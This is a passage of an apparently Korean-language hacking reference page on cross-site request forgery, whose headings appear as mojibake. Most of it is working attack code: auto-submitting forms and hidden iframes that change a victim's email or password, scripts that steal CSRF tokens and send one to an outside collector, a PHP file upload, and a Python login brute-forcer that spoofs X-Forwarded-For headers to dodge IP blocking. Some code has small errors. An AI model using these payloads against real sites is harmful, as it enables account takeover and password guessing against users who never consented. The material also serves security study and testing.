<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET ìš”ì²­
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### í¼ POST ìš”ì²­
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeì„ í†µí•´ Form POST ìš”ì²­í•˜ê¸°
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST ìš”ì²­**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST ìš”ì²­
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST ìš”ì²­ v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### ì•„ì´í”„ë ˆì„ ë‚´ì—ì„œ í¼ POST ìš”ì²­
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF í† í°ì„ ë„ìš©í•˜ê³  POST ìš”ì²­ì„ ë³´ë‚´ê¸°**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF í† í°ì„ ë„ìš©í•˜ê³  iframe, í¼ ë° Ajaxë¥¼ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ ë³´ë‚´ê¸°**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRF í† í°ì„ ë„ìš©í•˜ê³  iframeê³¼ í¼ì„ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ ë³´ë‚´ê¸°**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **í† í°ì„ ë„ìš©í•˜ê³  2ê°œì˜ iframeì„ ì‚¬ìš©í•˜ì—¬ ì „ì†¡í•˜ê¸°**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxë¥¼ ì‚¬ìš©í•˜ì—¬ CSRF í† í°ì„ ë„ìš©í•˜ê³  í¼ì„ í†µí•´ POST ìš”ì²­ ë³´ë‚´ê¸°**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOë¥¼ ì´ìš©í•œ CSRF
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF ë¡œê·¸ì¸ ë¸Œë£¨íŠ¸ í¬ìŠ¤

ì´ ì½”ë“œëŠ” CSRF í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ì¸ í¼ì„ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê°€ëŠ¥í•œ IP ë¸”ë™ë¦¬ìŠ¤íŠ¸ ìš°íšŒë¥¼ ì‹œë„í•˜ê¸° ìœ„í•´ X-Forwarded-For í—¤ë”ë„ ì‚¬ìš©ë¨):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ë„êµ¬ <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## ì°¸ê³  ìë£Œ

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì—¬ ê²½í—˜ä¸°å¯Œí•œ í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°**\
í•´í‚¹ì˜ ì¦ê±°ì›€ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ì„ í†µí•´ ë¹ ë¥¸ ì†ë„ì˜ í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì•Œì•„ë‘ì„¸ìš”

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
